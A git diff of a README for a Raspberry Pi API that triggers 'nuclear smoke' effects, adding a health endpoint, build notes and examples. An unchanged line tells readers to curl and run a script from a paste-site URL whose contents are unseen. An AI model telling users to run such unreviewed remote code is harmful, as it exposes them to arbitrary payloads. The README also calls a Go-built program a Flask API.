@@ -5,8 +5,30 @@ A minimal Flask API for controlling nuclear smoke effects on a Raspberry Pi via 
 To trigger the smoke & sound effect, curl and run this: 
 https://hst.sh/raw/otehupilec
 
+## Features
+The API has various endpoints to set health of the API and a smoke call to set off the nuclear smoke.
+The specifics can be found below along with examples of API calls
+
+## Build Process
+**Note**: The latest executable can be found in the nuclear-api directory
+
+The executable can be cross complied for a raspberry pi running `armv71` using the
+following go build command.
+
+```bash
+env GOOS=linux GOARCH=arm GOARM=7 go build -o nuclear-api main.go
+```
+
 ---
 ## Endpoints
+### `GET /health`
+Health check. Returns 200 OK if the API is responsive.
+
+**Response:**
+```json
+{ "status": "ok" }
+```
+
 ### `POST /smoke`
 Trigger the nuclear smoke effect for a specified duration.
 
@@ -36,18 +58,14 @@ Trigger the nuclear smoke effect for a specified duration.
 ```json
 { "system busy": "Another request is being processed. Wait 5-10 seconds, then retry." }
 ```
-### `GET /health`
-Health check. Returns 200 OK if the API is responsive.
-
-**Response:**
-```json
-{ "status": "ok" }
-```
 
 ---
 
 ## Examples
 ```bash
+# Health check
+curl http://localhost:8000/health
+
 # Trigger smoke for 3 seconds
 curl http://localhost:8000/smoke \
      -H "Content-Type: application/json" \
@@ -57,9 +75,6 @@ curl http://localhost:8000/smoke \
 curl http://localhost:8000/smoke \
      -H "Content-Type: application/json" \
      -d '{"duration": 10}'
-
-# Health check
-curl http://localhost:8000/health
 ```
 
 ---
